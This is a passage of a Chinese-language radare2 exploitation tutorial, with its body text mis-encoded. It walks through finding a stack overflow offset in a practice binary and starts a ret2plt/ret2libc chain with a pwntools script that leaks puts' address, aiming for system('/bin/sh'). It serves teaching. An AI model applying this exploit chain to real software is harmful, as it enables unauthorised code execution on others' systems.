<h1 id="è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬"><a href="#è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬" class="headerlink" title="è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬"></a>è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬</h1><p>æ—¢ç„¶æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†æœ‰æ¼æ´çš„å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªpayloadæ¥åˆ©ç”¨å®ƒã€‚æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜äº†ï¼Œå°±æ˜¯åœ¨ç³»ç»Ÿä¸ŠæˆåŠŸå¼€ä¸€ä¸ªshellã€‚é¦–å…ˆï¼Œæˆ‘ä»¬è¦ç¡®è®¤ç¡®å®æœ‰ä¸€ä¸ªæœ‰æ¼æ´çš„å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬çš„payloadå¯ä»¥è¦†ç›–æ ˆçš„åç§»ã€‚</p>
<p><img src="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif" alt></p>
<p>æˆ‘ä»¬å°†ä¼šä½¿ç”¨ä¸€ä¸ª<code>radare2</code>æ¡†æ¶ä¸­çš„å·¥å…·ï¼Œå«åš<code>ragg2</code>ã€‚å®ƒèƒ½å¤Ÿä¸ºæˆ‘ä»¬ç”Ÿæˆä¸€æ®µå¾ªç¯çš„<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="noopener">å¾·å¸ƒé²å› åºåˆ—</a>ï¼Œç”¨æ¥æ£€æµ‹è¦†ç›–ç¼“å†²åŒºçš„ç¡®åˆ‡çš„åç§»å¤§å°ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ragg2 -</span></span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> -P [size]       prepend debruijn pattern</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> -r              show raw bytes instead of hexpairs</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span><span class="bash"> ragg2 -P 100 -r</span></span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬çš„ç¨‹åºé€šè¿‡è¾“å…¥æµè¯»å–æˆ‘ä»¬çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯ä»shellä¸­è¯»å–æˆ‘ä»¬çš„è¾“å…¥ã€‚æ•…æˆ‘ä»¬å°†ä¼šä½¿ç”¨åˆä¸€ä¸ªæ¥è‡ª<code>radare2</code>å·¥å…·ç®±ä¸­çš„å·¥å…·ï¼Œ<code>rarun2</code>ã€‚</p>
<blockquote>
<ul>
<li><p><code>rarun2</code>å¯ä»¥åœ¨ä¸åŒç¯å¢ƒã€å‚æ•°ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å¤¹ä¸‹è¿è¡Œç¨‹åºï¼Œå¹¶ä¸”è¦†ç›–é»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¾‹å¦‚<code>stdin</code>ï¼‰</p>
</li>
<li><p>å¦‚æœä½ éœ€è¦åœ¨è·‘ä¸€ä¸ªç¨‹åºæ—¶ä½¿ç”¨å¾ˆé•¿çš„å‚æ•°ï¼Œå®ƒä¼šèµ·å¾ˆå¤§çš„ä½œç”¨ã€‚è€Œä¸”æ¼æ´åˆ©ç”¨é€šå¸¸éƒ½ä¼šå‘è¾“å…¥æµä¼ ä¸€å¤§å †æ•°æ®ã€‚</p>
</li>
</ul>
</blockquote>
<p>æˆ‘ä»¬éœ€è¦åšä»¥ä¸‹çš„ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>ragg2</code>å°†å¾·å¸ƒé²å› åºåˆ—å†™å…¥ä¸€ä¸ªæ–‡ä»¶</li>
<li>æ–°å»ºä¸€ä¸ª<code>rarun2</code>é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠå‰ä¸€ä¸ªæ–‡ä»¶ä½œä¸º<code>stdin</code></li>
<li>è®©<code>radare2</code>æ¥æ‰¾åˆ°åç§»</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ragg2 -P 200 -r &gt; pattern.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat pattern.txt</span></span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAIâ€¦ &lt;truncated&gt; â€¦7AA8AA9AA0ABBABCABDABEABFA</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span><span class="bash"> vim profile.rr2</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span><span class="bash"> cat profile.rr2</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/rarun2</span></span><br><span class="line">stdin=./pattern.txt</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span><span class="bash"> r2 -r profile.rr2 -d megabeets_0x2</span></span><br><span class="line">Process with PID 21663 startedâ€¦</span><br><span class="line">= attach 21663 21663</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line"> </span><br><span class="line">â€” Use rarun2 to launch your programs with a predefined environment.</span><br><span class="line"><span class="meta">[0xf77c2b30]&gt;</span><span class="bash"> dc</span></span><br><span class="line">Selecting and continuing: 21663</span><br><span class="line"> </span><br><span class="line">.:: Megabeets ::.</span><br><span class="line"> </span><br><span class="line">Show me what you got?</span><br><span class="line">child stopped with signal 11</span><br><span class="line"> </span><br><span class="line"><span class="meta">[0x41417641]&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è¿è¡Œç¨‹åºï¼Œå¹¶å°†<em>pattern.txt</em>çš„å†…å®¹ç”¨<code>rarun2</code>ä¼ ç»™<code>stdin</code>ï¼Œ<em>SIGSEV 11</em>ã€‚</p>
<blockquote>
<ul>
<li><p>ä¸€ä¸ªä¿¡å·æ˜¯ä¸€ç§å‘é€ç»™è¿›ç¨‹æˆ–æ˜¯ä¸€ä¸ªå…·ä½“çº¿ç¨‹çš„å¼‚æ­¥é€šçŸ¥ï¼Œè¿™æ ·ä¸ä¹‹ç›¸åŒçš„è¿›ç¨‹å°±ä¼šåœ¨æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶å¾—åˆ°æé†’ã€‚</p>
</li>
<li><p>SIGSEGVï¼ˆ11ï¼‰ä¿¡å·åœ¨è®¿é—®äº†æŸä¸ªæ— æ•ˆçš„è™šæ‹Ÿå†…å­˜æˆ–æ®µé”™è¯¯åä¼šè§¦å‘ã€‚</p>
</li>
</ul>
</blockquote>
<p>ä½ å‘ç°äº†å—ï¼Ÿæˆ‘ä»¬å®æ—¶çš„æŒ‡é’ˆç°åœ¨æŒ‡å‘äº†<code>0x41417641</code>ã€‚è¿™æ˜¯ä¸€ä¸ªæ— æ•ˆçš„åœ°å€ï¼Œå®ƒè¡¨ç¤ºäº†å­—ç¬¦ä¸²<code>AvAA</code>ï¼ˆå°ç«¯åºåŠasciiç è½¬æ¢ï¼‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€çš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚<code>radare2</code>å…è®¸æˆ‘ä»¬æ‰¾åˆ°ç»™å‡ºçš„å€¼åœ¨å¾·å¸ƒé²å› åºåˆ—ä¸­çš„åç§»ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x41417641]&gt;</span><span class="bash"> wop?</span></span><br><span class="line">|Usage: wop[DO] len @ addr | value</span><br><span class="line">| wopD len [@ addr]  Write a De Bruijn Pattern of length â€˜lenâ€™ at address â€˜addrâ€™</span><br><span class="line">| wopO value         Finds the given value into a De Bruijn Pattern at current offset</span><br><span class="line"><span class="meta">[0x41417641]&gt;</span><span class="bash"> wopO `dr eip`</span></span><br><span class="line">140</span><br></pre></td></tr></table></figure>
<p>æ—¢ç„¶æˆ‘ä»¬å·²ç»çŸ¥é“éœ€è¦è¦†ç›–è¿”å›åœ°å€çš„åç§»ä¸º140ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹ç¼–å†™è„šæœ¬äº†ã€‚</p>
<h1 id="ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬"><a href="#ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬" class="headerlink" title="ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬"></a>ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬</h1><p>æˆ‘ä¹‹å‰ä¹Ÿæåˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œè¿™ç¯‡æ–‡ç« ä¸æ˜¯æ•™ä¸€äº›æ¼æ´åˆ©ç”¨çš„åŸºç¡€çŸ¥è¯†çš„ï¼Œå®ƒçš„ç›®çš„æ˜¯å±•ç¤º<code>radare2</code>åœ¨æ¼æ´åˆ©ç”¨ä¸­æ˜¯å¦‚ä½•ä½¿ç”¨çš„ã€‚å› æ­¤ï¼Œæˆ‘ä¸ä¼šè¿‡å¤šåœ°è§£é‡Šè„šæœ¬çš„æ¯ä¸ªéƒ¨åˆ†ã€‚</p>
<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åœ¨ç³»ç»Ÿä¸­äº§ç”Ÿä¸€ä¸ªshellã€‚è¿™æœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œå°¤å…¶æ˜¯è¿™æ ·ä¸€ä¸ªç¨‹åºã€‚ä¸ºäº†çŸ¥é“æˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“æˆ‘ä»¬ä¸èƒ½åšä»€ä¹ˆã€‚æˆ‘ä»¬çš„ç¨‹åºåœ¨å¼€äº†<code>ASLR</code>åœ°ç¯å¢ƒä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½çŒœæµ‹åˆ°<a href="https://en.wikipedia.org/wiki/C_standard_library" target="_blank" rel="noopener"><em>libc</em></a>åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚é‚£å°±å¯ä»¥å’Œ<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank" rel="noopener"><em>ret2libc</em></a>è¯´å†è§äº†ã€‚å¦å¤–ï¼Œç¨‹åºå¼€äº†<code>NX</code>ï¼Œè¿™æ„å‘³æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨æ ˆä¸Šæ”¾ä¸€ä¸ª<a href="https://en.wikipedia.org/wiki/Shellcode" target="_blank" rel="noopener"><em>shellcode</em></a>ç„¶åè·³è¿‡å»ã€‚</p>
<p>è™½ç„¶è¿™äº›ä¿æŠ¤è®©æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ä¸€äº›æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œç„¶è€Œè¿™ä¸èƒ½é˜»æ­¢æˆ‘ä»¬è½»æ¾åœ°ç»•è¿‡å®ƒä»¬ã€‚ç¼–å†™æˆ‘ä»¬çš„è„šæœ¬æ—¶ï¼Œéœ€è¦ç»†å¿ƒåœ°è§‚å¯Ÿæä¾›ç»™æˆ‘ä»¬çš„è¿è¡Œåº“ä»¥åŠå‡½æ•°ã€‚</p>
<p>è®©æˆ‘ä»¬å†æ¬¡é€šè¿‡è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼Œç„¶åçœ‹ä¸€çœ‹å®ƒä½¿ç”¨çš„è¿è¡Œåº“å’Œå‡½æ•°ã€‚å…ˆçœ‹åº“ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> r2 -d megabeets_0x2</span></span><br><span class="line">Process with PID 23072 startedâ€¦</span><br><span class="line">= attach 23072 23072</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line">â€” You haxor! Me jane?</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span><span class="bash"> il</span></span><br><span class="line">[Linked libraries]</span><br><span class="line">libc.so.61 library</span><br></pre></td></tr></table></figure>
<p><code>il</code>è¡¨ç¤º<code>Information libraries</code>ï¼Œå³å‘Šè¯‰æˆ‘ä»¬ç¨‹åºæ‰€ä½¿ç”¨çš„è¿è¡Œåº“ã€‚å¯¹äºè¯¥ç¨‹åºæ¥è¯´ï¼Œåªæœ‰æˆ‘ä»¬æœ€çˆ±çš„<em>libc</em>ã€‚</p>
<p>ç°åœ¨é€šè¿‡æ‰§è¡Œ<code>ii</code>å‘½ä»¤â€”â€”<code>Information Imports</code>ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¯¼å…¥çš„å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥åŠ ä¸Š<code>q</code>æ¥å‡å°‘å†—é•¿çš„è¾“å‡ºï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7763b30]&gt;</span><span class="bash"> ii</span></span><br><span class="line">[Imports]</span><br><span class="line">ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmp</span><br><span class="line">ordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpy</span><br><span class="line">ordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=puts</span><br><span class="line">ordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__</span><br><span class="line">ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_main</span><br><span class="line">ordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span><span class="bash"> iiq</span></span><br><span class="line">strcmp</span><br><span class="line">strcpy</span><br><span class="line">puts</span><br><span class="line">__gmon_start__</span><br><span class="line">__libc_start_main</span><br><span class="line">__isoc99_scanf</span><br></pre></td></tr></table></figure>
<h2 id="è®¡åˆ’"><a href="#è®¡åˆ’" class="headerlink" title="è®¡åˆ’"></a>è®¡åˆ’</h2><ul>
<li>æ³„æ¼<code>puts</code>çš„çœŸå®åœ°å€</li>
<li>è®¡ç®—<em>libc</em>çš„åŸºå€</li>
<li>è®¡ç®—<code>system</code>çš„åœ°å€</li>
<li>åœ¨<em>libc</em>ä¸­æ‰¾åˆ°åŒ…å«å­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€</li>
<li>è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>æ‰“å¼€ä¸€ä¸ªshell</li>
</ul>
<h2 id="æ³„æ¼putsçš„åœ°å€"><a href="#æ³„æ¼putsçš„åœ°å€" class="headerlink" title="æ³„æ¼putsçš„åœ°å€"></a>æ³„æ¼<code>puts</code>çš„åœ°å€</h2><p>æˆ‘ä»¬éœ€è¦ç”¨åˆ°<code>ret2plt</code>æ¥æ³„æ¼<code>puts</code>çš„çœŸå®åœ°å€ã€‚<code>PLT</code>ï¼ˆ<em>Procedure Linkage Table</em>ï¼‰æ˜¯å†…å­˜ä¸­çš„ç»“æ„ä½“ï¼Œå®ƒåŒ…æ‹¬ä¸€å°æ®µä»£ç ï¼Œèƒ½å¤Ÿè·³è½¬åˆ°åœ¨åŠ¨æ€é“¾æ¥æ—¶ç¨‹åºä¹‹å¤–çš„å‡½æ•°åœ°å€ã€‚ä¸ç®¡ä»€ä¹ˆæ—¶å€™ï¼Œæˆ‘ä»¬åœ¨<code>.text</code>æ®µçœ‹åˆ°<code>CALL</code>æŒ‡ä»¤ï¼Œå¹¶ä¸æ˜¯ç›´æ¥è·³åˆ°å‡½æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒè·³è½¬åˆ°äº†<code>PLT</code>ä¸­çš„ä¸€å°æ®µä»£ç ï¼Œåƒæ˜¯<code>func_name@plt</code>è¿™æ ·ã€‚è¿™ä¸€å°æ®µä»£ç è·³è½¬åˆ°<code>GOT</code>ï¼ˆ<em>Global Offset Table</em>ï¼‰ä¸­çš„åˆ—å‡ºçš„è¯¥å‡½æ•°çš„åœ°å€ã€‚<code>GOT</code>è¡¨å…¥å£ç‚¹ä¼šæŒ‡å›<code>PLT</code>ï¼ŒåŒæ—¶<code>PLT</code>ä¼šè°ƒç”¨ä¸€ä¸ªåŠ¨æ€é“¾æ¥å™¨æ¥ç¡®å®šè¯¥å‡½æ•°çš„çœŸå®åœ°å€ã€‚ä¸‹ä¸€æ¬¡è°ƒç”¨<code>func_name@plt</code>æ—¶ï¼Œè¿™æ®µä»£ç ä¼šç›´æ¥è·³è½¬åˆ°<code>GOT</code>è¡¨é‡Œçš„å‡½æ•°åœ°å€ã€‚æƒ³è¦äº†è§£æ›´å¤šå…³äºåŠ¨æ€é“¾æ¥çš„çŸ¥è¯†ï¼Œæˆ‘æ¨èä¼Šæ©å…°æ–¯æ³°å‹’å†™çš„<a href="https://www.airs.com/blog/archives/38" target="_blank" rel="noopener">è¿™ä¸€ç³»åˆ—å…³äºé“¾æ¥å™¨çš„æ–‡ç« </a></p>
<p>ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>puts</code>åœ¨<code>PLT</code>ä»¥åŠ<code>GOT</code>ä¸­çš„åœ°å€ï¼Œç„¶åè°ƒç”¨<code>puts@plt</code>å¹¶ä¸”æŠŠ<code>puts@got</code>ä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬å°†æŠŠè¿™äº›è°ƒç”¨è¿åœ¨ä¸€èµ·ï¼Œåœ¨<code>scanf</code>æ—¶ä¼ ç»™ç¨‹åºã€‚ç„¶åæˆ‘ä»¬ä¼šè¿”å›åˆ°æˆ‘ä»¬åˆ©ç”¨çš„ç¬¬äºŒä¸ªé˜¶æ®µã€‚<code>puts</code>å°†ä¼šæŠŠå®ƒçœŸå®çš„åœ°å€è¾“å‡ºå‡ºæ¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|       Stage 1       |</span><br><span class="line">+---------------------+</span><br><span class="line">| padding (140 bytes) |</span><br><span class="line">| puts@plt            |</span><br><span class="line">| entry_point         |</span><br><span class="line">| puts@got            |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
<p>ç¼–å†™è„šæœ¬æˆ‘ä»¬éœ€è¦ä½¿ç”¨<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><em>pwnlib</em></a>æ¡†æ¶ï¼Œè€Œä¸”å®ƒæ˜¯æˆ‘æœ€å–œæ¬¢çš„pythonæ¼æ´åˆ©ç”¨æ¡†æ¶ã€‚ä»–ç®€åŒ–äº†å¾ˆå¤šä¸œè¥¿ï¼Œè®©åˆ©ç”¨æ›´ç®€ä¾¿ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ä½ å–œæ¬¢çš„æ–¹å¼ã€‚</p>
<p>ä½¿ç”¨<code>pip</code>ä¸‹è½½<em>pwntools</em>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pip install --upgrade pip</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip install --upgrade pwntools</span></span><br></pre></td></tr></table></figure>
<p>ä½ å¯ä»¥åœ¨<a href="http://docs.pwntools.com/en/stable/index.html" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a>ä¸Šäº†è§£æ›´å¤šå…³äº<em>pwntools</em>ã€‚</p>
<p>è¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€é˜¶æ®µçš„pythonè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt =</span><br><span class="line">puts_got =</span><br><span class="line">entry_point =</span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span> <span class="comment"># padding</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬éœ€è¦å¡«å……<code>puts@plt</code>å’Œ<code>puts@got</code>çš„åœ°å€ï¼Œä»¥åŠç¨‹åºçš„å…¥å£ç‚¹ã€‚è®©æˆ‘ä»¬å›åˆ°<code>radare2</code>å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚å­—ç¬¦<code>#</code>ç”¨äºæ³¨é‡Šï¼Œå­—ç¬¦<code>~</code>æ˜¯<code>radare2</code>çš„shellä¸­çš„å†…ç½®<code>grep</code>ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7763b30]&gt;</span><span class="bash"> <span class="comment"># the address of puts@plt:</span></span></span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span><span class="bash"> ?v sym.imp.puts</span></span><br><span class="line">0x08048390</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span><span class="bash"> <span class="comment"># the address of puts@got:</span></span></span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span><span class="bash"> ?v reloc.puts_20</span></span><br><span class="line">0x0804a014</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span><span class="bash"> <span class="comment"># the address of programâ€™s entry point (entry0):</span></span></span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span><span class="bash"> ieq</span></span><br><span class="line">0x080483d0</span><br></pre></td></tr></table></figure>
<p><code>sym.imp.puts</code>å’Œ<code>reloc.puts_20</code>æ˜¯<code>radare2</code>è‡ªåŠ¨æ£€æµ‹åˆ°çš„æ ‡å¿—ã€‚å‘½ä»¤<code>ie</code>è¡¨ç¤º<code>Information Entrypoint</code>ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬å¡«å…¥æˆ‘ä»¬æ‰¾åˆ°çš„åœ°å€ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹è„šæœ¬ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python exploit.py</span></span><br><span class="line">[+] Starting local process â€˜./megabeets_0x2â€™: pid 23578</span><br><span class="line">[*] puts is at: 0xf75db710</span><br><span class="line">[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23578)</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span><span class="bash"> python exploit.py</span></span><br><span class="line">[+] Starting local process â€˜./megabeets_0x2â€™: pid 23592</span><br><span class="line">[*] puts is at: 0xf7563710</span><br><span class="line">[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23592)</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span><span class="bash"> python exploit.py</span></span><br><span class="line">[+] Starting local process â€˜./megabeets_0x2â€™: pid 23606</span><br><span class="line">[*] puts is at: 0xf75e3710</span><br><span class="line">[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23606)</span><br></pre></td></tr></table></figure>
